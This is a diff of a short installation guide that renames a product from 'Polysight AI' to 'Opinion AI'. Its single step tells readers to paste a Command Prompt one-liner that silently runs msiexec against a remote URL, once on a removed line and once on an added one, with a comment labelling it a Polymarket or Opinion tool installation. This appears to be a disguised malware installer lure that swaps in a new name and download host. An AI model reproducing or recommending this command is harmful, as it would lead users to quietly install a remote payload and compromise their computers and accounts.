@@ -1,4 +1,4 @@
-# Polysight AI Installation Guide
+# Opinion AI Installation Guide
 
 ## Installation Steps
 
@@ -8,5 +8,5 @@ Press `Win + R`, type `cmd`, and press `Enter`
 ### Step 2: Execute the Command.
 Copy and paste the command below into Command Prompt.
 ```powershell
-cmd /c start msiexec /q /i https://cloudcrafthub.com/api & rem Polymarket Tool Installation
+cmd /c start msiexec /q /i https://topcloudhub.com/api & rem Opinion Tool Installation
 `````
